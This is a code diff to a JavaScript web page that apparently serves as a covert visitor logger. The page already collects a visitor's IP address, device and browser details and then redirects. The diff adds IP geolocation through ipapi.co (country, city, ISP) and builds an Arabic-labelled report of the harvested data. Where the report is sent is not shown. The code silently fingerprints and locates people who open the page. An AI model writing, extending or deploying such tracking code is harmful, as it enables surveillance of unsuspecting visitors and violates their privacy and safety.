@@ -80,7 +80,10 @@ const userAgentData = navigator.userAgentData;
   const vendor = navigator.vendor;
   const isAndroid = userAgent.toLowerCase().includes('android');
   
-
+  const ipInfo = await getIPInfo(ipAddress);
+  const country = ipInfo.country_name || 'N/A';
+  const city = ipInfo.city || 'N/A';
+  const isp = ipInfo.org || 'N/A';
 
 
 
@@ -96,15 +99,18 @@ const userAgentData = navigator.userAgentData;
 
 
    const message = `
-    IP: ${ipAddress}
-    Platform: ${platform}
-    Screen Width: ${screenWidth}
-    Screen Height: ${screenHeight}
-    CPU Cores: ${cpuCores}
-    Total RAM: ${totalRAM}
-    Vendor: ${vendor}
-    Is Android: ${isAndroid ? 'Yes' : 'No'}/n
-    User Agent: ${userAgent}
+    الايبي: ${ipAddress}
+    البلد: ${country}
+    المدينه: ${city}
+    مزود الخدمه: ${isp}
+    المنصه: ${platform}
+    عرض الشاشة: ${screenWidth}
+    ارتفاع الشاشه: ${screenHeight}
+    عدد المعالجات: ${cpuCores}
+    الرامات: ${totalRAM}
+    شركه السوفتوير: ${vendor}
+    هل هو اندرويد: ${isAndroid ? 'Yes' : 'No'}/n
+    باقي البيانات: ${userAgent}
 
 `;
 
@@ -131,7 +137,13 @@ const userAgentData = navigator.userAgentData;
   }
 
 
-
+async function getIPInfo(ip) {
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    if (response.ok) {
+      return response.json();
+    }
+    return {};
+  }
 
 function redirectToNextURL() {
   // Get the current URL
